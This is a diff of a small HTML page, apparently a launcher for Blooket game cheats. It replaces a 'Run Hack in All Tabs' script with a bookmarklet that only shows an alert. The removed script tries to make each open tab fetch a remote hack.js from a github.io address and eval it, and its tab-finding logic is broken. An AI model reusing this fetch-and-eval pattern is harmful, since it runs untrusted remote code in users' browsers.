@@ -3,80 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Hack Runner</title>
+    <title>Bookmarklet Hack</title>
     <style>
         body {
             text-align: center;
             font-family: Arial, sans-serif;
-            background-color: #282c34;
+            background-color: #121212;
             color: white;
             margin-top: 50px;
         }
         h1 {
-            font-size: 28px;
-        }
-        button {
-            background-color: #28a745;
-            color: white;
-            padding: 15px 30px;
-            font-size: 18px;
-            border: none;
-            cursor: pointer;
-            border-radius: 8px;
-            margin-top: 20px;
-        }
-        button:hover {
-            background-color: #218838;
+            font-size: 36px;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 5px rgba(255, 0, 0, 0.7);
         }
         .container {
             background: #1e1e1e;
-            padding: 20px;
-            border-radius: 10px;
+            padding: 30px;
+            border-radius: 15px;
             display: inline-block;
-            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.2);
+            box-shadow: 0px 0px 20px rgba(255, 0, 0, 0.8);
+        }
+        .bookmarklet {
+            display: inline-block;
+            font-size: 24px;
+            color: white;
+            background-color: red;
+            padding: 20px 40px;
+            border-radius: 12px;
+            text-decoration: none;
+            font-weight: bold;
+            box-shadow: 0px 7px 15px rgba(255, 0, 0, 0.6);
+            transition: 0.3s;
+        }
+        .bookmarklet:hover {
+            background-color: darkred;
+            box-shadow: 0px 10px 20px rgba(255, 0, 0, 1);
+            transform: scale(1.1);
         }
     </style>
 </head>
 <body>
 
+    <h1>🚀 Bookmarklet Hack</h1>
     <div class="container">
-        <h1>🚀 Global Hack Runner</h1>
-        <p>Click the button below to run the hack in all open tabs.</p>
-        <button onclick="runHack()">🚀 Run Hack in All Tabs</button>
+        <p>Перетащите кнопку в панель закладок:</p>
+        <a class="bookmarklet" href="javascript:(function(){alert('Hack запущен!');})();">
+            🔴 Запустить Hack
+        </a>
     </div>
-
-    <script>
-        function runHack() {
-            alert("✅ Sending hack command to all tabs!");
-
-            // Открываем новую вкладку, чтобы получить доступ ко всем окнам
-            const controllerTab = window.open("about:blank", "_blank");
-
-            // Запускаем интервал, чтобы искать все вкладки
-            const interval = setInterval(() => {
-                // Получаем все открытые окна
-                const tabs = window.open("", "_self");
-
-                if (tabs) {
-                    try {
-                        // Запускаем хак в каждой найденной вкладке
-                        tabs.forEach(tab => {
-                            tab.eval(`
-                                fetch('https://vasiliy809.github.io/blooket-hacks/hack.js')
-                                    .then(response => response.text())
-                                    .then(eval)
-                                    .catch(error => console.error('❌ Hack failed:', error));
-                            `);
-                        });
-                        clearInterval(interval);
-                        alert("🔥 Hack executed in all tabs!");
-                    } catch (error) {
-                        console.error("❌ Error accessing tabs:", error);
-                    }
-                }
-            }, 1000);
-        }
-    </script>
 
 </body>
 </html>
